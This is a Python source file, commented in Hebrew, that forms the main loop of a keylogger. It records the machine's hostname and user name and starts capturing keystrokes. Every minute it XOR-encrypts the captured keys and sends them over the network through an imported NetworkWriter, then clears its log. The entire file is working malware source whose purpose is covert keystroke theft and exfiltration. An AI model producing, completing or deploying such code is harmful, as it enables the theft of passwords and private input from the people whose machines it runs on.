from component import *
import time
import os
import socket
import logging

# הגדרת תדירות השליחה (בשניות)
SEND_INTERVAL = 60  # ניתן לשנות לפי הצורך

def main():
    # יצירת אובייקטים
    key_logger = KeyLoggerService()
    encryptor = XorEcryptor()

    # זיהוי שם המחשב ושם המשתמש
    computer_name = socket.gethostname()
    try:
        user_name = os.getlogin()
    except Exception:
        user_name = "UnknownUser"

    print(f"🔴 Starting KeyLogger on {computer_name} ({user_name})...")
    key_logger.start_logging()

    try:
        while True:
            time.sleep(SEND_INTERVAL)  # מחכה לפי ההגדרה
            
            # חותמת זמן
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            
            # איסוף הנתונים שנאספו
            logged_keys = key_logger.get_logged_keys()
            key_data = "".join(logged_keys) if logged_keys else "No keys pressed"

            # יצירת המידע לשליחה
            data_to_send = {
                "timestamp": timestamp,
                "computer_name": computer_name,
                "user_name": user_name,
                "keys": key_data
            }

            # הצפנה
            encrypted_data = encryptor.encrypt(str(data_to_send))

            # שליחה
            try:
                NetworkWriter.send_data(encrypted_data)
                print(f"✅ Data sent at {timestamp} from {computer_name} ({user_name})")

                # ניקוי הלוג אחרי שליחה מוצלחת
                key_logger.clear_log()

            except Exception as e:
                print(f"❌ Error sending data: {e}")

    except KeyboardInterrupt:
        print("\n🛑 Stopping KeyLogger...")
        key_logger.stop_logging()

if __name__ == "__main__":
    main()

